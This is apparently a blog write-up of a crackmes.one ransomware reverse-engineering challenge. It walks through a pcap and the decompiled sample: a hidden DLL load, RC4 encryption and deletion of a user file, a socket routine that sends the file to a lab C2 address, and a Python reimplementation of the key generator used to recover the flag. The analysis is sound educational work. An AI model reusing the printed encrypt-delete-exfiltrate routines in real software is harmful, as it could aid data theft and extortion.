---
layout: post
title:  "Crackmes.one nukoneZ's Ransomware"
date:   2026-01-18 00:00:00 +0200
categories: ransomware crackme
---
On the famous crackmes.one site, a challenge named `nukoneZ's Ransomware` was awarded as the best challenge for the month of June 2025. This challenge was the last to be awarded, since it seems the website didn't announce other winners in the following months. Moved by curiosity, I've played this challenge and here's the writeup.

- Do not remove this line (it will not be displayed)
{:toc}

# Introduction
This is a challenge written in C/C++ for Windows platform, classified with a difficulty level of 3.1 (Medium)[^1].

The description of the challenge, reported on crackmes.one, is:

> A hacker launched a ransomware attack on Lisa’s machine, encrypting all critical data in her wallet. Help Lisa recover her lost files!

As suggested even by the challenge's name, this is something ransomware-related, so, most likely, we will have to deal with some encrypted file.

The downloaded zip contains another zip file named `Ransomware.zip`, and its content is the following:

```shell
$ unzip -l Ransomware.zip 
Archive:  Ransomware.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2025-06-11 09:00   Ransomware/
   149945  2025-06-11 01:08   Ransomware/Click_Me.exe
    29040  2025-06-11 01:24   Ransomware/RecordUser.pcapng
---------                     -------
   178985                     3 files
```

## RecordUser.pcapng Analysis
The `RecordUser.pcapng` file contains 4 different streams:

- HTTP GET request from `192.168.134.132` to `http://192.168.56.1:8000/anonymous`
- 3 different TCP streams from `192.168.134.1` to `192.168.134.132:8888` with different data exchanged

The `anonymous` file returned by the web server seems to be encrypted, as well as the first 2 TCP streams. The most interesting stream is the last one, since it is a log:

```
LOG:125
[2025-06-10 09:14:23.642] [INFO] [User: Lisa] Accessed suspicious website: https://freemusic-fastdownload[.]fun/randomfolder/
LOG:122
[2025-06-10 09:14:26.891] [WARNING] [User: Lisa] Downloaded suspicious executable file: Click_Me.exe from external source.
LOG:109
[2025-06-10 09:14:27.012] [AV Monitor] Suspicious file "Click_Me.exe" detected. Heuristic analysis pending...
LOG:134
[2025-06-10 09:15:03.217] [CRITICAL] [User: Lisa] Executed potentially malicious file: C:\Users\Lisa\Downloads\Ransomware\Click_Me.exe
LOG:120
[2025-06-10 09:15:03.401] [AV Monitor] ALERT: Click_Me.exe flagged as high-risk (Potential Ransomware behavior detected)
LOG:114
[2025-06-10 09:15:05.402] [NETWORK] Malicious process established outbound TCP connection to 192.168.134.132:23946
LOG:125
[2025-06-10 09:15:06.005] [Firewall] Suspicious network activity allowed: No rule matched ... potential backdoor established.
LOG:98
[2025-06-10 09:15:10.763] [RANSOMWARE] File encryption started: C:\ProgramData\Important\ (*.lckd)
LOG:106
[2025-06-10 09:15:11.001] [RANSOMWARE] Sensitive file encrypted: C:\Users\Lisa\Documents\wallet_backup.dat
LOG:100
[2025-06-10 09:15:11.223] [AV Monitor] Real-time protection bypassed. File system changes confirmed.
LOG:86
[2025-06-10 09:15:12.348] [RANSOMWARE] Behavior confirmed: Click_Me.exe is ransomware.
LOG:83
[2025-06-10 09:15:14.120] [CRITICAL] System compromised. Ransom note expected soon.
```

From these logs it is possible to reconstruct what's happened: Lisa downloaded a malicious file (`Click_Me.exe`) from a suspicious website and executed it, causing the encryption of all its personal data. So, the analysis of `Click_Me.exe` should reveal functions that perform Internet requests and encryption of files.

## Click_Me.exe Analysis

The file `Click_Me.exe` file is a classic PE without any kind of obfuscation:

```shell
$ file Click_Me.exe 
Click_Me.exe: PE32+ executable for MS Windows 5.02 (console), x86-64, 20 sections
```

So, I've opened it with IDA to inspect its inner workings. Here's the `main` function:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *Block; // [rsp+28h] [rbp-8h]

  _main();
  Block = (void *)sub_1860();
  if ( !Block )
    return -1;
  if ( (unsigned int)sub_1DE1(Block) || (unsigned int)sub_1FB3() )
  {
    free(Block);
    return -1;
  }
  else
  {
    free(Block);
    return 0;
  }
}
```

The function `_main()` is used only to initialize a static variable named `initialized` to `1`.

More interesting is the function `sub_1860()`:

```c
void *sub_1860()
{
  void *v1; // [rsp+28h] [rbp-58h]
  void *Buffer; // [rsp+30h] [rbp-50h]
  int v3; // [rsp+3Ch] [rbp-44h]
  FILE *Stream; // [rsp+40h] [rbp-40h]
  FARPROC ProcAddress; // [rsp+48h] [rbp-38h]
  FARPROC pget_result_bytes; // [rsp+58h] [rbp-28h]
  void *Src; // [rsp+60h] [rbp-20h]
  FARPROC pgen_from_file; // [rsp+68h] [rbp-18h]
  void *Block; // [rsp+70h] [rbp-10h]
  HMODULE hlibgen; // [rsp+78h] [rbp-8h]

  hlibgen = LoadLibraryA("C:\\Users\\Huynh Quoc Ky\\Downloads\\Ransomware\\libgen.dll");
  if ( !hlibgen )
    return 0;
  Block = malloc(0x20u);
  if ( !Block )
  {
    FreeLibrary(hlibgen);
    return 0;
  }
  pgen_from_file = GetProcAddress(hlibgen, "gen_from_file");
  if ( pgen_from_file )
  {
    Src = (void *)((__int64 (__fastcall *)(const char *))pgen_from_file)("anonymous");
    if ( Src )
    {
      memcpy(Block, Src, 0x20u);
      FreeLibrary(hlibgen);
      return Block;
    }
  }
  pget_result_bytes = GetProcAddress(hlibgen, "get_result_bytes");
  if ( pget_result_bytes && ((int (__fastcall *)(void *, __int64))pget_result_bytes)(Block, 32) > 0 )
  {
    FreeLibrary(hlibgen);
    return Block;
  }
  ProcAddress = GetProcAddress(hlibgen, "gen");
  if ( ProcAddress )
  {
    Stream = fopen("anonymous", "rb");
    if ( Stream )
    {
      fseek(Stream, 0, 2);
      v3 = ftell(Stream);
      rewind(Stream);
      if ( v3 > 0 )
      {
        Buffer = malloc(v3);
        if ( Buffer )
        {
          fread(Buffer, 1u, v3, Stream);
          v1 = (void *)((__int64 (__fastcall *)(void *, _QWORD))ProcAddress)(Buffer, v3);
          if ( v1 )
          {
            memcpy(Block, v1, 0x20u);
            free(Buffer);
            fclose(Stream);
            FreeLibrary(hlibgen);
            return Block;
          }
          free(Buffer);
        }
      }
      fclose(Stream);
    }
  }
  free(Block);
  FreeLibrary(hlibgen);
  return 0;
}
```

Here, the first thing this function does is to load the DLL `libgen.dll` using `LoadLibraryA()`. Indeed, this DLL does not compare in the `.idata` section of the PE, maybe as an attempt to hide it from a first and quick inspection:

![Import Directory Table](/assets/crackmes_ransomware/idata.png)

Then, a buffer `Block` of `0x20` (32) bytes is created.

Before diving in to the logic of the function, it is worth noting that 3 different functions of `libgen.dll` are called:

- `gen_from_file()` passing `anonymous` as argument
- `get_result_bytes()` passing `Block` and its size as arguments
- `gen()` passing a `Buffer` and its size (`v3`) as argument

`anonymous` is the same name of the file contained in the GET request in the `RecordUser.pcapng` file, maybe they're the same files.

In addition, `Buffer` passed as argument to `gen()` contains the content of this `anonymous` file, since its pointer is stored inside the `Stream` variable and then read into `Buffer`.

Function `sub_1860()`'s logic is the following:

- Loads `libgen.dll`
- Calls `gen_from_file()` with string `anonymous` as argument
    - If the returned buffer is valid, it is copied in `Block` and returned it

Otherwise:

- Calls `get_result_bytes()` passing `Block` and its size as argument
    - If the return value of the function is greater than `0`, `Block` is returned

Otherwise:

- Calls `gen()` passing `Buffer` (which holds `anonysmous` file content) and its file as argument
    - If the buffer returned is valid, it is copied in to `Block` and then returned it

Otherwise the function returns `0`.

At this point, the content of `libgen.dll` is unknown, so it is impossible to say exactly what the three functions do. So, let's move on to the rest of `main()` function.

If `Block` returned by `sub_1860()` is valid, then 2 functions are called:

- `sub_1DE1(Block)`
- `sub_1FB3()`

## Encryption and Sending Personal File - sub_1DE1()
This function encrypts the file `C:\ProgramData\Important\user.html` to `C:\ProgramData\Important\user.html.enc` using RC4[^2] and then sends it to C2 server, deleting the original and in clear text file. Here's the decompiled code:

```c
__int64 __fastcall sub_1DE1(char *a1)
{
  FILE *v2; // [rsp+38h] [rbp-28h]
  char *v3; // [rsp+40h] [rbp-20h]
  void *v4; // [rsp+48h] [rbp-18h]
  int v5; // [rsp+54h] [rbp-Ch]
  FILE *Stream; // [rsp+58h] [rbp-8h]

  Stream = fopen("C:\\ProgramData\\Important\\user.html", "rb");
  if ( !Stream )
    return 0xFFFFFFFFLL;
  fseek(Stream, 0, 2);
  v5 = ftell(Stream);
  rewind(Stream);
  v4 = malloc(v5);
  v3 = (char *)malloc(v5);
  if ( v4 && v3 )
  {
    fread(v4, 1u, v5, Stream);
    fclose(Stream);
    sub_1668(a1, 32, (char *)v4, v3, v5);
    v2 = fopen("C:\\ProgramData\\Important\\user.html.enc", "wb");
    if ( v2 )
    {
      fwrite(v3, 1u, v5, v2);
      fclose(v2);
      sub_183D("C:\\ProgramData\\Important\\user.html");
      free(v4);
      free(v3);
      sub_1AEB("C:\\ProgramData\\Important\\user.html.enc");
      return 0;
    }
    else
    {
      free(v4);
      free(v3);
      return 0xFFFFFFFFLL;
    }
  }
  else
  {
    fclose(Stream);
    free(v4);
    free(v3);
    return 0xFFFFFFFFLL;
  }
}
```

From the strings passed as arguments to the called functions, it's easy to infer that this function encrypts content. In particular, the file `C:\ProgramData\Important\user.html` is encrypted in `C:\ProgramData\Important\user.html.enc`.

The function `sub_1668()` takes different arguments and the first, `a1`, is the `Block` buffer created by the function `sub_1860()` previously analysed. This function calls other 2 functions and they are used to perform RC4 encryption, using the `Block` buffer as the key:

- `sub_148C()` prepares the S-box
- `sub_1558()` perform the encryption

### S-Box Initialization - sub_148C()
```c
__int64 __fastcall sub_148C(__int64 a1, int a2, __int64 a3)
{
  int j; // [rsp+24h] [rbp-Ch]
  int i; // [rsp+28h] [rbp-8h]
  int v6; // [rsp+2Ch] [rbp-4h]

  v6 = 0;
  for ( i = 0; i <= 255; ++i )
    *(_BYTE *)(i + a3) = i;
  for ( j = 0; j <= 255; ++j )
  {
    v6 = (*(unsigned __int8 *)(j + a3) + v6 + *(unsigned __int8 *)(j % a2 + a1)) % 256;
    swap(j + a3, a3 + v6);
  }
  return 0;
}
```

### RC4 Encryption - sub_1558()
```c
__int64 __fastcall sub_1558(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 i; // [rsp+30h] [rbp-10h]
  int v6; // [rsp+38h] [rbp-8h]
  int v7; // [rsp+3Ch] [rbp-4h]

  v7 = 0;
  v6 = 0;
  for ( i = 0; i < a4; ++i )
  {
    v7 = (v7 + 1) % 256;
    v6 = (v6 + *(unsigned __int8 *)(v7 + a1)) % 256;
    swap(v7 + a1, a1 + v6);
    *(_BYTE *)(a3 + i) = *(_BYTE *)((unsigned __int8)(*(_BYTE *)(v7 + a1) + *(_BYTE *)(v6 + a1)) + a1)
                       ^ *(_BYTE *)(a2 + i);
  }
  return 0;
}
```

Once encrypted the file, the function `sub_183D()` is called to delete the original clear text file. This function is a simple wrapper of `DeleteFileA()`.

After that, the function `sub_1AEB()` is called passing the encrypted file name as argument. This function sends to a C2 server the content of the file. This is easily identifiable due to the presence of calls to `WSAStartup()`, `connect()`, `send()` `closesocket()` and `WSACleaup()`. It is interesting to note that this function sends even the file size before the file content:

```c
if ( connect(s, &name, 16) >= 0 )
    {
        buf[0] = HIBYTE(len);
        buf[1] = BYTE2(len);
        buf[2] = BYTE1(len);
        buf[3] = len;
        send(s, buf, 4, 0);
        send(s, (const char *)Buffer, len, 0);
        printf("Sent %s (%ld bytes) to server\n", a1, len);
        closesocket(s);
        WSACleanup();
        free(Buffer);
        return 0;
    }
```

From the arguments of `connect()` the C2 IP and its listening port are obtained and they are `192.168.134.132:8888`, the same reported in the pcap file.

## Encryption and Sending of libgen.dll - sub_1FB3()
This function is the same of the previous `sub_1DE1()` except for the file open who is `C:\Users\Huynh Quoc Ky\Downloads\Ransomware\libgen.dll` and for the encryption algorithm, who is not RC4 anymore but AES-256-ECB with the SHA256 string of `hackingisnotacrime` as password. Since this file is sent to the C2 server, it is possible to recover the missing DLL, as we've just discovered it is contained in a stream of the pcap file. In fact, among the streams, there is the one that contains the DLL. Once extracted the TCP data sent and removed the first 4 bytes who specified the file size, it was possible to decrypt it with the following command:

```shell
openssl enc -aes-256-ecb -d -in encrypted_libgen.dll -K 14f137ab39f56d7ae16b70c987bd85b0033fd158a6f010bf926048952264f807 -out libgen.dll
```

# libgen.dll Analysis
Now, we know this DLL is used to generate the RC4 key used to encrypt the .html file, so, now the goal is to recover this key to decrypt the file.

As stated before, from the function `sub_1860()` called by `main()` we know 3 different functions of this DLL are called:

- `gen_from_file()` passing `anonymous` as argument
- `get_result_bytes()` passing `Block` and its size as arguments
- `gen()` passing a `Buffer` and its size (`v3`) as argument

Actually, since the victim's machine has the `anonymous` file, only `gen_from_file()` is called, given that the function returns after the `Block` buffer is populated. Anyway, this is irrelevant, since the remaining code of `sub_1860()` still opens `anonymous` file and passes its content to `gen()`, resulting in the same function executed. In fact, `gen_from_file()` takes a file name string as input, opens the file and then pass its content to `gen()`, the function that actually generate the RC4 password.

```c
_BYTE *__fastcall gen_from_file(const char *a1)
{
  _BYTE *v2; // [rsp+20h] [rbp-20h]
  void *Buffer; // [rsp+28h] [rbp-18h]
  int v4; // [rsp+34h] [rbp-Ch]
  FILE *Stream; // [rsp+38h] [rbp-8h]

  Stream = fopen(a1, "rb");
  if ( !Stream )
    return 0;
  fseek(Stream, 0, 2);
  v4 = ftell(Stream);
  rewind(Stream);
  if ( v4 > 0 && (Buffer = malloc(v4)) != 0 )
  {
    fread(Buffer, 1u, v4, Stream);
    fclose(Stream);
    v2 = gen(Buffer, v4);
    free(Buffer);
    return v2;
  }
  else
  {
    fclose(Stream);
    return 0;
  }
}
```

The `gen()` function contains the algorithm used to generate the RC4 key starting from the content of a buffer. Here's the decompiled code:

```c
_BYTE *__fastcall gen(char *buf, unsigned __int64 bufLen)
{
  _BYTE *result; // rax
  unsigned __int8 j; // [rsp+3h] [rbp-Dh]
  char n; // [rsp+4h] [rbp-Ch]
  unsigned __int8 m; // [rsp+5h] [rbp-Bh]
  unsigned __int64 i; // [rsp+8h] [rbp-8h]

  i = 0;
  while ( 2 )
  {
    if ( i >= bufLen )
      return 0;
    switch ( buf[i] )
    {
      case 1:
        if ( i + 2 >= bufLen )
        {
          i = bufLen;
        }
        else
        {
          a1[(unsigned __int8)buf[i + 1]] = buf[i + 2];
          i += 3LL;
        }
        continue;
      case 2:
        if ( i + 2 >= bufLen )
        {
          i = bufLen;
        }
        else
        {
          j = buf[i + 1];
          if ( j <= 3u )
            a2[j] = buf[i + 2];
          i += 3LL;
        }
        continue;
      case 3:
        if ( i + 2 >= bufLen )
        {
          i = bufLen;
        }
        else
        {
          m = buf[i + 1];
          n = buf[i + 2];
          if ( (m & 1) != 0 )
            a3[m] = a1[m] - n;
          else
            a3[m] = n + a1[m];
          i += 3LL;
        }
        continue;
      case 4:
        if ( i + 1 >= bufLen )
        {
          i = bufLen;
        }
        else
        {

          resultArray[(unsigned __int8)buf[i + 1]] = a2[buf[i + 1] & 3] ^ a3[(unsigned __int8)buf[i + 1]];
          i += 2LL;
        }
        continue;
      case 5:
        result = resultArray;
        break;
      default:
        result = 0;
        break;
    }
    break;
  }
  return result;
}
```

Instead of trying to understand its logic, I've implemented the algorithm in a Python script and executed with the content of `anonymous` file (extracted from the pcap file). The result was the following:

```shell
$ python gen_rc4_key.py anonymous 
r4ns0mw@rE_c4n_d357r0y_f1l3s_n0w
```

Here's the script code:

```python
a1 = [0] * 256
a2 = [0] * 32
a3 = [0] * 256
resultArray = [0] * 256
result = 1
buf = []

with open("./anonymous", "rb") as input:
    for x in range(0, 269):
        c = int.from_bytes(input.read(1))
        buf.append(c)

    i = 0
    bufLen = len(buf)

    while True:
        if i >= bufLen:
            exit(0)
        c = buf[i]
        if c == 1:
            if i + 2 >= bufLen:
                i = bufLen
            else:
                a1[buf[i + 1]] = buf[i + 2]
                i = i + 3
        elif c == 2:
            if i + 2 >= bufLen:
                i = bufLen
            else:
                j = buf[i + 1]
                if j <= 3:
                    a2[j] = buf[i + 2]
                i = i + 3
        elif c == 3:
            if i + 2 >= bufLen:
                i = bufLen
            else:
                m = buf[i + 1]
                n = buf[i + 2]
                if (m & 1) != 0:
                    a3[m] = a1[m] - n
                else:
                    a3[m] = n + a1[m]
                i = i + 3
        elif c == 4:
            if i + 1 >= bufLen:
                i = bufLen
            else:
                resultArray[buf[i + 1]] = a2[buf[i + 1] & 3] ^ a3[buf[i + 1]]
                i = i + 2
        elif c == 5:
            result = resultArray
            break
        else:
            result = 0
            break

for c in resultArray:
    print(chr(c), end="")
print()
```

# Obtaining the Flag
The last thing to do is to recover the flag. Surely it is inside the remaining html file encrypted, since it is the last file to recover. We know the algorithm and the password used to encrypt it. From the pcap file we can recover its content.

Using CyberChef, the decryption was successfull:

![user.html File Recovered](/assets/crackmes_ransomware/user.html.png)

Opening the html file file revealed the flag:

![Final Flag](/assets/crackmes_ransomware/flag.png)

# References
{: .no_toc}

[^1]: [https://crackmes.one/crackme/6848e4102b84be7ea77437ba]()
[^2]: [https://en.wikipedia.org/wiki/RC4]()
